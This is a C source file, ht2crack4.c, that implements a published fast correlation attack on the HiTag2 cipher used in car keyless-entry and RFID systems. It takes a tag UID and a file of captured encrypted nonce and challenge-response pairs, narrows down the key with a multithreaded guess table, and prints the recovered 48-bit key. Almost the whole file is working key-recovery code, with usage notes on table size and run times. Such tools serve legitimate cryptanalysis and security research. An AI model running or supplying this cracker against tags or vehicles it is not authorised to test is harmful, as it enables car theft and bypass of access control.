/* ht2crack4.c
 *
 * This is an implementation of the fast correlation attack in Section 4.4 of the
 * paper, Lock It and Still Lose It - On the (In)Security of Automotive Remote
 * Keyless Entry Systems by Garcia, Oswald, Kasper and Pavlides.
 * It is essentially an attack on the HiTag2 cryptosystem; it uses a small number
 * (between 4 and 32) of encrypted nonce and challenge response pairs for the same
 * UID to recover the key.
 *
 * Key recovery is performed by enumerating all 65536 of the first 16 bits of the
 * key and then, using the encrypted nonces and challenge response pairs, scoring
 * all of the guesses for how likely they are to be the first 16 bits of the actual
 * key.  The best of these guesses are then expanded by 1 bit and the process
 * iterates until all bits have been guessed.  The resulting guesses are then searched
 * for the one that is actually correct, testing against two pairs.
 *
 * The program reads in up to 32 encrypted nonce and challenge response pairs from
 * the supplied file; the number actually used is specified on the command line
 * (defaults to all those read in).  The default size of the table is 800000 but this
 * can be changed via the command line options.
 *
 * Using more encrypted nonce and challenge response pairs improves the chances of
 * recovering the key and doesn't significantly add to the time it takes.
 *
 * Using a larger table also improves the chances of recovering the key but
 * *significantly* increases the time it takes to run.
 *
 * Best recommendation is to use as many encrypted nonce and challenge response
 * pairs as you can, and start with a table size of about 500000, as this will take
 * around 45s to run.  If it fails, run it again with a table size of 1000000,
 * continuing to double the table size until it succeeds.  Alternatively, start with
 * a table size of about 3000000 and expect it to take around 4 mins to run, but
 * with a high likelihood of success.
 *
 * Setting table size to a large number (~32000000) will likely blow up the stack
 * during the recursive qsort().  This could be fixed by making the stack space
 * larger but really, you need a smaller table and more encrypted nonces.
 *
 * The scoring of the guesses is controversial, having been tweaked over and again
 * to find a measure that provides the best results.  Feel free to tweak it yourself
 * if you don't like it or want to try alternative metrics.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <math.h>
#include <pthread.h>
#include "ht2crackutils.h"

/* you could have more than 32 traces, but you shouldn't really need
 * more than 16.  You can still win with 8 if you're lucky. */
#define MAX_NONCES 32

/* set this to the number of virtual cores you have */
#define NUM_THREADS 8

/* encrypted nonce and keystream storage
 * ks is ~enc_aR */
struct nonce {
    uint64_t enc_nR;
    uint64_t ks;
};

/* guess table entry - we store key guesses and do the maths to convert
 * to states in the code
 * score is used for sorting purposes
 * b0to31 is an array of the keystream generated from the init state
 * that is later XORed with the encrypted nonce and key guess
 */
struct guess {
    uint64_t key;
    double score;
    uint64_t b0to31[MAX_NONCES];
};

/* thread_data is the data sent to the scoring threads */
struct thread_data {
    unsigned int start;
    unsigned int end;
    unsigned int size;
};

/* guess table and encrypted nonce/keystream table */
struct guess *guesses = NULL;
unsigned int num_guesses;
struct nonce nonces[MAX_NONCES];
unsigned int num_nRaR;
uint64_t uid;
int maxtablesize = 800000;
uint64_t supplied_testkey = 0;

static void usage(void) {
    printf("ht2crack4 - K Sheldrake, based on the work of Garcia et al\n\n");
    printf("Cracks a HiTag2 key using a small number (4 to 16) of encrypted\n");
    printf("nonce and challenge response pairs, using a fast correlation\n");
    printf("approach.\n\n");
    printf(" -u UID (required)\n");
    printf(" -n NONCEFILE (required)\n");
    printf(" -N number of nRaR pairs to use (defaults to 32)\n");
    printf(" -t TABLESIZE (defaults to 800000\n");
    printf("Increasing the table size will slow it down but will be more\n");
    printf("successful.\n");

    exit(1);
}


/* macros to select bits from lfsr states - from RFIDler code */
#define pickbits2_2(S, A, B)       ( ((S >> A) & 3) | ((S >> (B - 2)) & 0xC) )
#define pickbits1x4(S, A, B, C, D) ( ((S >> A) & 1) | ((S >> (B - 1)) & 2) | \
                                   ((S >> (C - 2)) & 4) | ((S >> (D - 3)) & 8) )
#define pickbits1_1_2(S, A, B, C)  ( ((S >> A) & 1) | ((S >> (B - 1)) & 2) | \
                                   ((S >> (C - 2)) & 0xC) )
#define pickbits2_1_1(S, A, B, C)  ( ((S >> A) & 3) | ((S >> (B - 2)) & 4) | \
                                   ((S >> (C - 3)) & 8) )
#define pickbits1_2_1(S, A, B, C)  ( ((S >> A) & 1) | ((S >> (B - 1)) & 6) | \
                                   ((S >> (C - 3)) & 8) )

/* boolean tables for fns a, b and c - from RFIDler code */
const uint64_t ht2_function4a = 0x2C79; // 0010 1100 0111 1001
const uint64_t ht2_function4b = 0x6671; // 0110 0110 0111 0001
const uint64_t ht2_function5c = 0x7907287B; // 0111 1001 0000 0111 0010 1000 0111 1011

/* following arrays are the probabilities of getting a 1 from each function, given
 * a known least-sig pattern. first index is num bits in known part, second is the
 * bit pattern of the known part. */
double pfna[][8] = {
    {0.50000, 0.50000, },
    {0.50000, 0.50000, 0.50000, 0.50000, },
    {0.50000, 0.00000, 0.50000, 1.00000, 0.50000, 1.00000, 0.50000, 0.00000, },
};
double pfnb[][8] = {
    {0.62500, 0.37500, },
    {0.50000, 0.75000, 0.75000, 0.00000, },
    {0.50000, 0.50000, 0.50000, 0.00000, 0.50000, 1.00000, 1.00000, 0.00000, },
};
double pfnc[][16] = {
    {0.50000, 0.50000, },
    {0.62500, 0.62500, 0.37500, 0.37500, },
    {0.75000, 0.50000, 0.25000, 0.75000, 0.50000, 0.75000, 0.50000, 0.00000, },
    {1.00000, 1.00000, 0.50000, 0.50000, 0.50000, 0.50000, 0.50000, 0.00000, 0.50000, 0.00000, 0.00000, 1.00000, 0.50000, 1.00000, 0.50000, 0.00000, },
};


/* hitag2_crypt works on the post-shifted form of the lfsr; this is the ref in rfidler code */
/*
static uint32_t hitag2_crypt(uint64_t s) {
    uint32_t bitindex;

    bitindex = (ht2_function4a >> pickbits2_2(s, 1, 4)) & 1;
    bitindex |= ((ht2_function4b << 1) >> pickbits1_1_2(s, 7, 11, 13)) & 0x02;
    bitindex |= ((ht2_function4b << 2) >> pickbits1x4(s, 16, 20, 22, 25)) & 0x04;
    bitindex |= ((ht2_function4b << 3) >> pickbits2_1_1(s, 27, 30, 32)) & 0x08;
    bitindex |= ((ht2_function4a << 4) >> pickbits1_2_1(s, 33, 42, 45)) & 0x10;

    return (ht2_function5c >> bitindex) & 1;
}
*/

/* ht2crypt works on the pre-shifted form of the lfsr; this is the ref in the paper */
static uint64_t ht2crypt(uint64_t s) {
    uint64_t bitindex;

    bitindex = (ht2_function4a >> pickbits2_2(s, 2, 5)) & 1;
    bitindex |= ((ht2_function4b << 1) >> pickbits1_1_2(s, 8, 12, 14)) & 0x02;
    bitindex |= ((ht2_function4b << 2) >> pickbits1x4(s, 17, 21, 23, 26)) & 0x04;
    bitindex |= ((ht2_function4b << 3) >> pickbits2_1_1(s, 28, 31, 33)) & 0x08;
    bitindex |= ((ht2_function4a << 4) >> pickbits1_2_1(s, 34, 43, 46)) & 0x10;

    return (ht2_function5c >> bitindex) & 1;
}


/* fnL is the feedback function for the reference code */
/*
static uint64_t fnL(uint64_t x) {
    return (bitn(x, 0) ^ bitn(x, 2) ^ bitn(x, 3) ^ bitn(x, 6) ^ bitn(x, 7) ^ bitn(x, 8) ^
            bitn(x, 16) ^ bitn(x, 22) ^ bitn(x, 23) ^ bitn(x, 26) ^ bitn(x, 30) ^ bitn(x, 41) ^
            bitn(x, 42) ^ bitn(x, 43) ^ bitn(x, 46) ^ bitn(x, 47));
}
*/

/* packed_size is an array that maps the number of confirmed bits in a state to
 * the number of relevant bits.
 * e.g. if there are 16 confirmed bits in a state, then packed_size[16] = 8 relevant bits.
 * this is for pre-shifted lfsr */
unsigned int packed_size[] = { 0,  0,  0,  1,  2,  2,  3,  4,  4,  5,  5,  5,  5,  6,  6,  7,  8,
                               8,  9,  9,  9,  9, 10, 10, 11, 11, 11, 12, 12, 13, 14, 14, 15,
                               15, 16, 17, 17, 17, 17, 17, 17, 17, 17, 17, 18, 19, 19, 20, 20
                             };


/* f20 is the same as hitag2_crypt except it works on the packed version
 * of the state where all 20 relevant bits are squashed together */
static uint64_t f20(uint64_t y) {
    uint64_t bitindex;

    bitindex = (ht2_function4a >> (y & 0xf)) & 1;
    bitindex |= ((ht2_function4b << 1) >> ((y >> 4) & 0xf)) & 0x02;
    bitindex |= ((ht2_function4b << 2) >> ((y >> 8) & 0xf)) & 0x04;
    bitindex |= ((ht2_function4b << 3) >> ((y >> 12) & 0xf)) & 0x08;
    bitindex |= ((ht2_function4a << 4) >> ((y >> 16) & 0xf)) & 0x10;

    return (ht2_function5c >> bitindex) & 1;
}


/* packstate packs the relevant bits from LFSR state into 20 bits for pre-shifted lfsr */
static uint64_t packstate(uint64_t s) {
    uint64_t packed;

    packed =  pickbits2_2(s, 2, 5);
    packed |= (pickbits1_1_2(s, 8, 12, 14) << 4);
    packed |= (pickbits1x4(s, 17, 21, 23, 26) << 8);
    packed |= (pickbits2_1_1(s, 28, 31, 33) << 12);
    packed |= (pickbits1_2_1(s, 34, 43, 46) << 16);

    return packed;
}


/* create_guess_table mallocs the tables */
static void create_guess_table(void) {
    guesses = (struct guess *)calloc(1, sizeof(struct guess) * maxtablesize);
    if (!guesses) {
        printf("cannot allocate memory for guess table\n");
        exit(1);
    }
}


/* init the guess table by reading in the encrypted nR,aR values and
 * setting the first 2^16 key guesses */
static void init_guess_table(char *filename, char *uidstr) {
    unsigned int i, j;
    FILE *fp;
    char *buf = NULL;
    char *buft1 = NULL;
    char *buft2 = NULL;
    size_t lenbuf = 64;

    if (!guesses) {
        printf("guesses is NULL\n");
        exit(1);
    }

    // read uid
    if (!strncmp(uidstr, "0x", 2)) {
        uid = rev32(hexreversetoulong(uidstr + 2));
    } else {
        uid = rev32(hexreversetoulong(uidstr));
    }


    // read encrypted nonces and challenge response values
    fp = fopen(filename, "r");
    if (!fp) {
        printf("cannot open nRaR file\n");
        exit(1);
    }

    num_nRaR = 0;
    buf = (char *)calloc(1, lenbuf);
    if (!buf) {
        printf("cannot calloc buf\n");
        exit(1);
    }

    while ((getline(&buf, &lenbuf, fp) > 0) && (num_nRaR < MAX_NONCES)) {
        buft1 = strchr(buf, ' ');
        if (!buft1) {
            printf("invalid file input on line %u\n", num_nRaR + 1);
            exit(1);
        }
        *buft1 = 0x00;
        buft1++;
        buft2 = strchr(buft1, '\n');
        if (!buft2) {
            printf("no CR on line %u\n", num_nRaR + 1);
            exit(1);
        }
        *buft2 = 0x00;
        if (!strncmp(buf, "0x", 2)) {
            nonces[num_nRaR].enc_nR = rev32(hexreversetoulong(buf + 2));
            nonces[num_nRaR].ks = rev32(hexreversetoulong(buft1 + 2)) ^ 0xffffffff;
        } else {
            nonces[num_nRaR].enc_nR = rev32(hexreversetoulong(buf));
            nonces[num_nRaR].ks = rev32(hexreversetoulong(buft1)) ^ 0xffffffff;
        }
        num_nRaR++;
    }

    fclose(fp);
    fprintf(stderr, "Loaded %u nRaR pairs\n", num_nRaR);

    // set key and copy in enc_nR and ks values
    // set score to -1.0 to distinguish them from 0 scores
    for (i = 0; i < 65536; i++) {
        guesses[i].key = i;
        guesses[i].score = -1.0;
        for (j = 0; j < num_nRaR; j++) {
            guesses[i].b0to31[j] = 0;
        }
    }

    num_guesses = 65536;
}


/* bit_score calculates the ratio of partial states that could generate
 * the resulting bit b to all possible states
 * size is the number of confirmed bits in the state */
static double bit_score(uint64_t s, uint64_t size, uint64_t b) {
    uint64_t packed;
    uint64_t chopped;
    unsigned int n;
    uint64_t b1;
    double nibprob1, nibprob0, prob;
    unsigned int fncinput;


    // chop away any bits beyond size
    chopped = s & ((1l << size) - 1);
    // and pack the remaining bits
    packed = packstate(chopped);

    // calc size of packed version
    n = packed_size[size];

    b1 = b & 0x1;

    // calc probability of getting b1

    // start by calculating probability of getting a 1,
    // then fix if b1==0 (subtract from 1)

    if (n == 0) {
        // catch the case where we have no relevant bits and return
        // the default probability
        return 0.5;
    } else if (n < 4) {
        // incomplete first nibble
        // get probability of getting a 1 from first nibble
        // and by subtraction from 1, prob of getting a 0
        nibprob1 = pfna[n - 1][packed];
        nibprob0 = 1.0 - nibprob1;

        // calc fnc prob as sum of probs of nib 1 producing a 1 and 0
        prob = (nibprob0 * pfnc[0][0]) + (nibprob1 * pfnc[0][1]);
    } else if (n < 20) {
        // calculate the fnc input first, then we'll fix it
        fncinput = (ht2_function4a >> (packed & 0xf)) & 1;
        fncinput |= ((ht2_function4b << 1) >> ((packed >> 4) & 0xf)) & 0x02;
        fncinput |= ((ht2_function4b << 2) >> ((packed >> 8) & 0xf)) & 0x04;
        fncinput |= ((ht2_function4b << 3) >> ((packed >> 12) & 0xf)) & 0x08;
        fncinput |= ((ht2_function4a << 4) >> ((packed >> 16) & 0xf)) & 0x10;

        // mask to keep the full nibble bits
        fncinput = fncinput & ((1l << (n / 4)) - 1);

        if ((n % 4) == 0) {
            // only complete nibbles
            prob = pfnc[(n / 4) - 1][fncinput];
        } else {
            // one nibble is incomplete
            if (n <= 16) {
                // it's in the fnb area
                nibprob1 = pfnb[(n % 4) - 1][packed >> ((n / 4) * 4)];
                nibprob0 = 1.0 - nibprob1;
                prob = (nibprob0 * pfnc[n / 4][fncinput]) + (nibprob1 * pfnc[n / 4][fncinput | (1l << (n / 4))]);
            } else {
                // it's in the final fna
                nibprob1 = pfna[(n % 4) - 1][packed >> 16];
                nibprob0 = 1.0 - nibprob1;
                prob = (nibprob0 * ((ht2_function5c >> fncinput) & 0x1)) + (nibprob1 * ((ht2_function5c >> (fncinput | 0x10)) & 0x1));
            }
        }
    } else {
        // n==20
        prob = f20(packed);
    }

    if (b1) {
        return prob;
    } else {
        return (1.0 - prob);
    }
}


/* score is like bit_score but does multiple bit correlation.
 * bit_score and then shift and then repeat, adding all
 * bit_scores together until no bits remain. bit_scores are
 * multiplied by the number of relevant bits in the scored state
 * to give weight to more complete states. */
static double score(uint64_t s, unsigned int size, uint64_t ks, unsigned int kssize) {
    double sc;

    if ((size == 1) || (kssize == 1)) {
        sc = bit_score(s, size, ks & 0x1);
        return (sc * (packed_size[size] + 1));
    } else {
        // I've introduced a weighting for each score to
        // give more significance to bigger windows.

        sc = bit_score(s, size, ks & 0x1);

        // if a bit_score returns a probability of 0 then this can't be a winner
        if (sc == 0.0) {
            return 0.0;
        } else {

            double sc2 = score(s >> 1, size - 1, ks >> 1, kssize - 1);

            // if score returns a probability of 0 then this can't be a winner
            if (sc2 == 0.0) {
                return 0.0;
            } else {
                return (sc * (packed_size[size] + 1)) + sc2;
            }
        }
    }
}


/* score_traces runs score for each encrypted nonce */
static void score_traces(struct guess *g, unsigned int size) {
    double total_score = 0.0;

    // don't bother scoring traces that are already losers
    if (g->score == 0.0) {
        return;
    }

    for (unsigned int i = 0; i < num_nRaR; i++) {
        // calc next b
        // create lfsr - lower 32 bits is uid, upper 16 bits are lower 16 bits of key
        // then shift by size - 16, insert upper key XOR enc_nonce XOR bitstream,
        // and calc new bit b
        uint64_t lfsr = (uid >> (size - 16)) | ((g->key << (48 - size)) ^
                                                ((nonces[i].enc_nR ^ g->b0to31[i]) << (64 - size)));
        g->b0to31[i] = g->b0to31[i] | (ht2crypt(lfsr) << (size - 16));

        // create lfsr - lower 16 bits are lower 16 bits of key
        // bits 16-47 are upper bits of key XOR enc_nonce XOR bitstream
        lfsr = g->key ^ ((nonces[i].enc_nR ^ g->b0to31[i]) << 16);

        double sc = score(lfsr, size, nonces[i].ks, 32);

        // look out for losers
        if (sc == 0.0) {
            g->score = 0.0;
            return;
        }
        total_score = total_score + sc;
    }

    // save average score
    g->score = total_score / num_nRaR;

}


/* score_all_traces runs score_traces for every key guess in the table */
/* this was used in the non-threaded version */
/*
void score_all_traces(unsigned int size)
{
    unsigned int i;

    for (i=0; i<num_guesses; i++) {
        score_traces(&(guesses[i]), size);
    }
}
*/

/* score_some_traces runs score_traces for every key guess in a section of the table */
static void *score_some_traces(void *data) {
    unsigned int i;
    struct thread_data *tdata = (struct thread_data *)data;

    for (i = tdata->start; i < tdata->end; i++) {
        score_traces(&(guesses[i]), tdata->size);
    }

    return NULL;
}


/* score_all_traces runs score_traces for every key guess in the table */
static void score_all_traces(unsigned int size) {
    pthread_t threads[NUM_THREADS];
    void *status;
    struct thread_data tdata[NUM_THREADS];
    unsigned int i;
    unsigned int chunk_size;

    chunk_size = num_guesses / NUM_THREADS;

    // create thread data
    for (i = 0; i < NUM_THREADS; i++) {
        tdata[i].start = i * chunk_size;
        tdata[i].end = (i + 1) * chunk_size;
        tdata[i].size = size;
    }

    // fix last chunk
    tdata[NUM_THREADS - 1].end = num_guesses;

    // start the threads
    for (i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&(threads[i]), NULL, score_some_traces, (void *)(tdata + i))) {
            printf("cannot start thread %u\n", i);
            exit(1);
        }
    }

    // wait for threads to end
    for (i = 0; i < NUM_THREADS; i++) {
        if (pthread_join(threads[i], &status)) {
            printf("cannot join thread %u\n", i);
            exit(1);
        }
    }
}





/* cmp_guess is the comparison function for qsorting the guess table */
static int cmp_guess(const void *a, const void *b) {
    struct guess *a1 = (struct guess *)a;
    struct guess *b1 = (struct guess *)b;

    if (a1->score < b1->score) {
        return 1;
    } else if (a1->score > b1->score) {
        return -1;
    } else {
        return 0;
    }
}


/* expand all guesses in first half of (sorted) table by
 * copying them into the second half and extending the copied
 * ones with an extra 1, leaving the first half with an extra 0 */
static void expand_guesses(unsigned int halfsize, unsigned int size) {
    unsigned int i, j;

    for (i = 0; i < halfsize; i++) {
        guesses[i + halfsize].key = guesses[i].key | (1l << size);
        guesses[i + halfsize].score = guesses[i].score;
        for (j = 0; j < num_nRaR; j++) {
            guesses[i + halfsize].b0to31[j] = guesses[i].b0to31[j];
        }
    }
}


/* checks if the supplied test key is still in the table, which
 * is useful when testing different scoring methods */
static void check_supplied_testkey(unsigned int size) {
    uint64_t partkey;
    unsigned int i;

    partkey = supplied_testkey & ((1l << size) - 1);

    for (i = 0; i < num_guesses; i++) {
        if (guesses[i].key == partkey) {
            fprintf(stderr, " supplied test key score = %1.10f, position = %u\n", guesses[i].score, i);
            return;
        }
    }

    fprintf(stderr, "TEST KEY NO LONGER IN GUESSES\n");
    exit(1);
}


/* execute_round scores the guesses, sorts them and expands the good half */
static void execute_round(unsigned int size) {
    unsigned int halfsize;

    // score all the current guesses
    score_all_traces(size);

    // sort the guesses by score
    qsort(guesses, num_guesses, sizeof(struct guess), cmp_guess);

    if (supplied_testkey) {
        check_supplied_testkey(size);
    }

    // identify limit
    if (num_guesses < (maxtablesize / 2)) {
        halfsize = num_guesses;
    } else {
        halfsize = (maxtablesize / 2);
    }

    // expand guesses
    expand_guesses(halfsize, size);

    num_guesses = halfsize * 2;
}


/* crack is the main cracking algo; it executes the rounds */
static void crack(void) {
    for (unsigned int i = 16; i <= 48; i++) {
        fprintf(stderr, "round %2u, size=%2u\n", i - 16, i);
        execute_round(i);

        // print some metrics
        uint64_t revkey = rev64(guesses[0].key);
        uint64_t foundkey = ((revkey >> 40) & 0xff) | ((revkey >> 24) & 0xff00) | ((revkey >> 8) & 0xff0000) | ((revkey << 8) & 0xff000000) | ((revkey << 24) & 0xff00000000) | ((revkey << 40) & 0xff0000000000);
        fprintf(stderr, " guess=%012" PRIx64 ", num_guesses = %u, top score=%1.10f, min score=%1.10f\n", foundkey, num_guesses, guesses[0].score, guesses[num_guesses - 1].score);
    }
}

/* test function to make sure I know how the LFSR works */
/*
static void testkey(uint64_t key) {
    uint64_t i;
    uint64_t b0to31 = 0;
    uint64_t ks = 0;
    uint64_t lfsr;
    uint64_t nRxorkey;
    Hitag_State hstate;

    printf("ORIG REFERENCE\n");
    hitag2_init(&hstate, key, uid, nonces[0].enc_nR);
    printf("after init with key, uid, nR:\n");
    printstate(&hstate);
    b0to31 = 0;
    for (i = 0; i < 32; i++) {
        b0to31 = (b0to31 >> 1) | (hitag2_nstep(&hstate, 1) << 31);
    }
    printf("ks = 0x%08" PRIx64 ", enc_aR = 0x%08" PRIx64 ", aR = 0x%08" PRIx64 "\n", b0to31, nonces[0].ks ^ 0xffffffff, nonces[0].ks ^ 0xffffffff ^ b0to31);
    printstate(&hstate);

    printf("\n");


    printf("MY REFERENCE\n");
    // build initial lfsr
    lfsr = uid | ((key & 0xffff) << 32);
    b0to31 = 0;
    // xor upper part of key with encrypted nonce
    nRxorkey = nonces[0].enc_nR ^ (key >> 16);
    // insert keyupper xor encrypted nonce xor ks
    for (i = 0; i < 32; i++) {
        // store ks - when done, the first ks bit will be bit 0 and the last will be bit 31
        b0to31 = (b0to31 >> 1) | (ht2crypt(lfsr) << 31);
        // insert new bit
        lfsr = lfsr | ((((nRxorkey >> i) & 0x1) ^ ((b0to31 >> 31) & 0x1)) << 48);
        // shift lfsr
        lfsr = lfsr >> 1;
    }
    printf("after init with key, uid, nR:\n");
    printf("lfsr =\t\t");
    printbin2(lfsr, 48);
    printf("\n");

    // iterate lfsr with fnL, extracting ks
    for (i = 0; i < 32; i++) {
        // store ks - when done, the first ks bit will be bit 0 and the last will be bit 31
        ks = (ks >> 1) | (ht2crypt(lfsr) << 31);
        // insert new bit
        lfsr = lfsr | (fnL(lfsr) << 48);
        // shift lfsr
        lfsr = lfsr >> 1;
    }

    printf("ks = 0x%08" PRIx64 ", aR = 0x%08" PRIx64 ", ks(orig) = 0x%08" PRIx64 ", aR(orig) = %08" PRIx64 "\n", ks, ks ^ 0xffffffff, nonces[0].ks, nonces[0].ks ^ 0xffffffff);
    printf("lfsr = \t\t");
    printbin2(lfsr, 48);
    printf("\n\n");
}
*/

/* test function to generate test data */
/*
static void gen_bitstreams_testks(struct guess *g, uint64_t key) {
    unsigned int i, j;
    uint64_t nRxorkey, lfsr, ks;

    for (j = 0; j < num_nRaR; j++) {

        // build initial lfsr
        lfsr = uid | ((key & 0xffff) << 32);
        g->b0to31[j] = 0;
        // xor upper part of key with encrypted nonce
        nRxorkey = nonces[j].enc_nR ^ (key >> 16);
        // insert keyupper xor encrypted nonce xor ks
        for (i = 0; i < 32; i++) {
            // store ks - when done, the first ks bit will be bit 0 and the last will be bit 31
            g->b0to31[j] = (g->b0to31[j] >> 1) | (ht2crypt(lfsr) << 31);
            // insert new bit
            lfsr = lfsr | ((((nRxorkey >> i) & 0x1) ^ ((g->b0to31[j] >> 31) & 0x1)) << 48);
            // shift lfsr
            lfsr = lfsr >> 1;
        }

        ks = 0;
        // iterate lfsr with fnL, extracting ks
        for (i = 0; i < 32; i++) {
            // store ks - when done, the first ks bit will be bit 0 and the last will be bit 31
            ks = (ks >> 1) | (ht2crypt(lfsr) << 31);
            // insert new bit
            lfsr = lfsr | (fnL(lfsr) << 48);
            // shift lfsr
            lfsr = lfsr >> 1;
        }

        printf("orig ks = 0x%08" PRIx64 ", gen ks = 0x%08" PRIx64 ", b0to31 = 0x%08" PRIx64 "\n", nonces[j].ks, ks, g->b0to31[j]);
        if (nonces[j].ks != ks) {
            printf(" FAIL!\n");
        }
    }
}
*/

/* test function */
/*
static void test(void) {
    uint64_t lfsr;
    uint64_t packed;

    uint64_t i;


    for (i = 0; i < 1000; i++) {
        lfsr = ((uint64_t)rand() << 32) | rand();
        packed = packstate(lfsr);

        if (hitag2_crypt(lfsr) != f20(packed)) {
            printf(" * * * FAIL: %3" PRIu64 ": 0x%012" PRIx64 " = %u, 0x%012" PRIx64 " = 0x%05" PRIx64 "\n", i, lfsr, hitag2_crypt(lfsr), packed, f20(packed));
        }
    }

    printf("test done\n");
}
*/

/* check_key tests the potential key against an encrypted nonce, ks pair */
static int check_key(uint64_t key, uint64_t enc_nR, uint64_t ks) {
    Hitag_State hstate;
    uint64_t bits;
    int i;

    hitag2_init(&hstate, key, uid, enc_nR);
    bits = 0;
    for (i = 0; i < 32; i++) {
        bits = (bits >> 1) | (hitag2_nstep(&hstate, 1) << 31);
    }
    if (ks == bits) {
        return 1;
    } else {
        return 0;
    }
}


/* start up */
int main(int argc, char *argv[]) {
    unsigned int i;
    uint64_t revkey;
    uint64_t foundkey;
    int tot_nRaR = 0;
    char c;
    char *uidstr = NULL;
    char *noncefilestr = NULL;

//    test();
//    exit(0);

    while ((c = getopt(argc, argv, "u:n:N:t:T:h")) != -1) {
        switch (c) {
            case 'u':
                uidstr = optarg;
                break;
            case 'n':
                noncefilestr = optarg;
                break;
            case 'N':
                tot_nRaR = atoi(optarg);
                break;
            case 't':
                maxtablesize = atoi(optarg);
                break;
            case 'T':
                supplied_testkey = rev64(hexreversetoulonglong(optarg));
                break;
            case 'h':
                usage();
                break;
            default:
                usage();
        }
    }

    if (!uidstr || !noncefilestr || (maxtablesize <= 0)) {
        usage();
    }

    create_guess_table();

    init_guess_table(noncefilestr, uidstr);

    if ((tot_nRaR > 0) && (tot_nRaR <= num_nRaR)) {
        num_nRaR = tot_nRaR;
    }
    fprintf(stderr, "Using %u nRaR pairs\n", num_nRaR);

    crack();

    // test all key guesses and stop if one works
    for (i = 0; i < num_guesses; i++) {
        if (check_key(guesses[i].key, nonces[0].enc_nR, nonces[0].ks) &&
                check_key(guesses[i].key, nonces[1].enc_nR, nonces[1].ks)) {
            printf("WIN!!! :)\n");
            revkey = rev64(guesses[i].key);
            foundkey = ((revkey >> 40) & 0xff) | ((revkey >> 24) & 0xff00) | ((revkey >> 8) & 0xff0000) | ((revkey << 8) & 0xff000000) | ((revkey << 24) & 0xff00000000) | ((revkey << 40) & 0xff0000000000);
            printf("key = %012" PRIX64 "\n", foundkey);
            exit(0);
        }
    }

    printf("FAIL :( - none of the potential keys in the table are correct.\n");
    exit(1);
    return 0;
}



